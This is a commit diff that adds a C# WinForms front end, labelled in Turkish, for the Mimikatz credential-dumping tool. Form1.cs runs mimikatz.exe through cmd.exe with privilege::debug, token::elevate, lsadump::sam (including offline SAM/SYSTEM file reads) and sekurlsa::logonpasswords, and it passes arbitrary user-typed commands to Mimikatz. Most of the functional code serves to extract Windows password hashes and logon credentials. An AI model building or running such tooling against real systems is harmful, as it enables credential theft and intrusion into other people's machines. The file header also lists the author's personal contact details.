74efd07b78f77b6b2edf0cb54b5677f739de30eb
Ebubekir Bastama <ebubekirbastama@elmalicesmekuruyemis.com>
2020-01-10 14:27:37 +0300

    Add files via upload

---
+++ Mimikatz/Mimikatz/Form1.Designer.cs
@@ -0,0 +1,243 @@
+﻿namespace Mimikatz
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.panelEx2 = new DevComponents.DotNetBar.PanelEx();
+            this.pictureBox3 = new System.Windows.Forms.PictureBox();
+            this.panelEx1 = new DevComponents.DotNetBar.PanelEx();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBoxX1 = new DevComponents.DotNetBar.Controls.TextBoxX();
+            this.buttonX2 = new DevComponents.DotNetBar.ButtonX();
+            this.buttonX1 = new DevComponents.DotNetBar.ButtonX();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.comboBox1 = new System.Windows.Forms.ComboBox();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.panelEx2.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
+            this.panelEx1.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // panelEx2
+            // 
+            this.panelEx2.CanvasColor = System.Drawing.SystemColors.Control;
+            this.panelEx2.Controls.Add(this.pictureBox3);
+            this.panelEx2.Dock = System.Windows.Forms.DockStyle.Top;
+            this.panelEx2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.panelEx2.Location = new System.Drawing.Point(0, 0);
+            this.panelEx2.Name = "panelEx2";
+            this.panelEx2.Size = new System.Drawing.Size(639, 51);
+            this.panelEx2.Style.Alignment = System.Drawing.StringAlignment.Center;
+            this.panelEx2.Style.BackColor1.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBackground;
+            this.panelEx2.Style.BackColor2.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBackground2;
+            this.panelEx2.Style.Border = DevComponents.DotNetBar.eBorderType.SingleLine;
+            this.panelEx2.Style.BorderColor.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBorder;
+            this.panelEx2.Style.ForeColor.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelText;
+            this.panelEx2.Style.GradientAngle = 90;
+            this.panelEx2.TabIndex = 6;
+            this.panelEx2.Text = "Mimikatz GUİ";
+            this.panelEx2.DragEnter += new System.Windows.Forms.DragEventHandler(this.panelEx2_DragEnter);
+            this.panelEx2.MouseDown += new System.Windows.Forms.MouseEventHandler(this.panelEx2_MouseDown);
+            this.panelEx2.MouseMove += new System.Windows.Forms.MouseEventHandler(this.panelEx2_MouseMove);
+            this.panelEx2.MouseUp += new System.Windows.Forms.MouseEventHandler(this.panelEx2_MouseUp);
+            // 
+            // pictureBox3
+            // 
+            this.pictureBox3.BackColor = System.Drawing.Color.Transparent;
+            this.pictureBox3.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.pictureBox3.Dock = System.Windows.Forms.DockStyle.Right;
+            this.pictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox3.Image")));
+            this.pictureBox3.Location = new System.Drawing.Point(576, 0);
+            this.pictureBox3.Name = "pictureBox3";
+            this.pictureBox3.Size = new System.Drawing.Size(63, 51);
+            this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox3.TabIndex = 8;
+            this.pictureBox3.TabStop = false;
+            this.pictureBox3.Click += new System.EventHandler(this.pictureBox3_Click);
+            // 
+            // panelEx1
+            // 
+            this.panelEx1.CanvasColor = System.Drawing.SystemColors.Control;
+            this.panelEx1.Controls.Add(this.label3);
+            this.panelEx1.Controls.Add(this.pictureBox1);
+            this.panelEx1.Controls.Add(this.label2);
+            this.panelEx1.Controls.Add(this.textBoxX1);
+            this.panelEx1.Controls.Add(this.buttonX2);
+            this.panelEx1.Controls.Add(this.buttonX1);
+            this.panelEx1.Controls.Add(this.richTextBox1);
+            this.panelEx1.Controls.Add(this.label1);
+            this.panelEx1.Controls.Add(this.comboBox1);
+            this.panelEx1.Controls.Add(this.panelEx2);
+            this.panelEx1.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.panelEx1.Location = new System.Drawing.Point(0, 0);
+            this.panelEx1.Name = "panelEx1";
+            this.panelEx1.Size = new System.Drawing.Size(639, 481);
+            this.panelEx1.Style.Alignment = System.Drawing.StringAlignment.Center;
+            this.panelEx1.Style.BackColor1.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBackground;
+            this.panelEx1.Style.BackColor2.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBackground2;
+            this.panelEx1.Style.Border = DevComponents.DotNetBar.eBorderType.SingleLine;
+            this.panelEx1.Style.BorderColor.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBorder;
+            this.panelEx1.Style.ForeColor.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelText;
+            this.panelEx1.Style.GradientAngle = 90;
+            this.panelEx1.TabIndex = 8;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(367, 390);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(75, 13);
+            this.label2.TabIndex = 15;
+            this.label2.Text = "Manuel Komut";
+            // 
+            // textBoxX1
+            // 
+            // 
+            // 
+            // 
+            this.textBoxX1.Border.Class = "TextBoxBorder";
+            this.textBoxX1.Location = new System.Drawing.Point(328, 406);
+            this.textBoxX1.Name = "textBoxX1";
+            this.textBoxX1.Size = new System.Drawing.Size(137, 20);
+            this.textBoxX1.TabIndex = 14;
+            // 
+            // buttonX2
+            // 
+            this.buttonX2.AccessibleRole = System.Windows.Forms.AccessibleRole.PushButton;
+            this.buttonX2.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
+            this.buttonX2.Location = new System.Drawing.Point(328, 437);
+            this.buttonX2.Name = "buttonX2";
+            this.buttonX2.Size = new System.Drawing.Size(137, 38);
+            this.buttonX2.TabIndex = 13;
+            this.buttonX2.Text = "Getir";
+            this.buttonX2.Click += new System.EventHandler(this.buttonX2_Click);
+            // 
+            // buttonX1
+            // 
+            this.buttonX1.AccessibleRole = System.Windows.Forms.AccessibleRole.PushButton;
+            this.buttonX1.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
+            this.buttonX1.Location = new System.Drawing.Point(490, 437);
+            this.buttonX1.Name = "buttonX1";
+            this.buttonX1.Size = new System.Drawing.Size(137, 38);
+            this.buttonX1.TabIndex = 10;
+            this.buttonX1.Text = "Getir";
+            this.buttonX1.Click += new System.EventHandler(this.buttonX1_Click);
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(3, 57);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(624, 328);
+            this.richTextBox1.TabIndex = 9;
+            this.richTextBox1.Text = "";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(523, 389);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(48, 13);
+            this.label1.TabIndex = 8;
+            this.label1.Text = "Komutlar";
+            // 
+            // comboBox1
+            // 
+            this.comboBox1.FormattingEnabled = true;
+            this.comboBox1.Items.AddRange(new object[] {
+            "Sam Okuma",
+            "Sam Okuma(Offline)",
+            "System Okuma(Offline)",
+            "Şifreleri Listele(sekurlsa)"});
+            this.comboBox1.Location = new System.Drawing.Point(490, 405);
+            this.comboBox1.Name = "comboBox1";
+            this.comboBox1.Size = new System.Drawing.Size(137, 21);
+            this.comboBox1.TabIndex = 7;
+            this.comboBox1.Text = "Sam Okuma";
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(15, 415);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(120, 58);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 16;
+            this.pictureBox1.TabStop = false;
+            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(12, 397);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(138, 13);
+            this.label3.TabIndex = 17;
+            this.label3.Text = "Offline Sam System Dosyası";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(639, 481);
+            this.Controls.Add(this.panelEx1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Form1";
+            this.panelEx2.ResumeLayout(false);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
+            this.panelEx1.ResumeLayout(false);
+            this.panelEx1.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private DevComponents.DotNetBar.PanelEx panelEx2;
+        private System.Windows.Forms.PictureBox pictureBox3;
+        private DevComponents.DotNetBar.PanelEx panelEx1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.ComboBox comboBox1;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private DevComponents.DotNetBar.ButtonX buttonX1;
+        private System.Windows.Forms.Label label2;
+        private DevComponents.DotNetBar.Controls.TextBoxX textBoxX1;
+        private DevComponents.DotNetBar.ButtonX buttonX2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ Mimikatz/Mimikatz/Form1.cs
@@ -0,0 +1,119 @@
+﻿using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Mimikatz
+{
+    /// <summary>
+    /// Name     : Ebubekir Bastama (C.)
+    /// Web Site : www.ebubekirbastama.com
+    /// Contact  : +90 5554128854
+    /// </summary>
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            CheckForIllegalCrossThreadCalls = false;
+            //pinfo.WindowStyle = ProcessWindowStyle.Hidden;
+            //pinfo.CreateNoWindow = true;
+            pinfo.UseShellExecute = false;
+            pinfo.RedirectStandardOutput = true;
+        }
+        public string debugyetkisi { get; set; } = "privilege::debug";
+        public string samokuma { get; set; } = "lsadump::sam";
+        public string token { get; set; } = "token::whoami";
+        public string tokenelevate { get; set; } = "token::elevate";
+        public string passwordall { get; set; } = "sekurlsa::logonpasswords";
+        public string Yol { get; set; }
+        Process proc = new Process();Thread th;
+        ProcessStartInfo pinfo = new ProcessStartInfo();
+        bool formTasiniyor = false; OpenFileDialog op;
+        Point baslangicNoktasi = new Point(0, 0);
+        void pictureBox3_Click(object sender, EventArgs e)
+        {
+            Application.Exit();
+        }
+        void panelEx2_DragEnter(object sender, DragEventArgs e)
+        {
+            if (e.Data.GetDataPresent(DataFormats.Text))
+                e.Effect = DragDropEffects.Copy;
+            else
+                e.Effect = DragDropEffects.None;
+        }
+        void panelEx2_MouseDown(object sender, MouseEventArgs e)
+        {
+            formTasiniyor = true;
+            baslangicNoktasi = new System.Drawing.Point(e.X, e.Y);
+        }
+        void panelEx2_MouseMove(object sender, MouseEventArgs e)
+        {
+            if (formTasiniyor)
+            {
+                Point p = PointToScreen(e.Location);
+                Location = new Point(p.X - this.baslangicNoktasi.X, p.Y - this.baslangicNoktasi.Y);
+            }
+        }
+        void panelEx2_MouseUp(object sender, MouseEventArgs e)
+        {
+            formTasiniyor = false;
+        }
+        void kmtt(string cmd)
+        {
+            pinfo.FileName = @"cmd.exe";
+            string kmtty = "/c mimikatz.exe " + debugyetkisi + " " + token + " " + tokenelevate + " "+ cmd;
+            pinfo.Arguments = kmtty;
+            proc.StartInfo = pinfo;
+            proc.Start();
+            richTextBox1.Text = "";
+            String outputResult = GetStreamOutput(proc.StandardOutput);
+            richTextBox1.AppendText(outputResult);
+
+        }
+        string GetStreamOutput(StreamReader stream)
+        { 
+            var outputReadTask = Task.Run(() => stream.ReadToEnd());
+
+            return outputReadTask.Result;
+        }
+        void buttonX1_Click(object sender, EventArgs e)
+        {
+            th = new Thread(bsl);th.Start();
+        }
+        void bsl()
+        {
+            if (comboBox1.Text == "Sam Okuma")
+            {
+                kmtt(samokuma);
+            }
+            else if (comboBox1.Text == "Sam Okuma(Offline)")
+            {
+                kmtt(samokuma +" sam:"+ @"\" + Yol);
+            }
+            else if (comboBox1.Text == "System Okuma(Offline)")
+            {
+                kmtt(samokuma + " system:" + @"\" + Yol);
+            }
+            else if (comboBox1.Text == "Şifreleri Listele(sekurlsa)")
+            {
+                kmtt(passwordall);
+            }
+        }
+        void buttonX2_Click(object sender, EventArgs e)
+        {
+            kmtt(textBoxX1.Text);
+        }
+        void pictureBox1_Click(object sender, EventArgs e)
+        {
+            op = new OpenFileDialog();
+            if (op.ShowDialog() == DialogResult.OK)
+            {
+                Yol = op.FileName.ToString();
+            }
+        }
+    }
+}
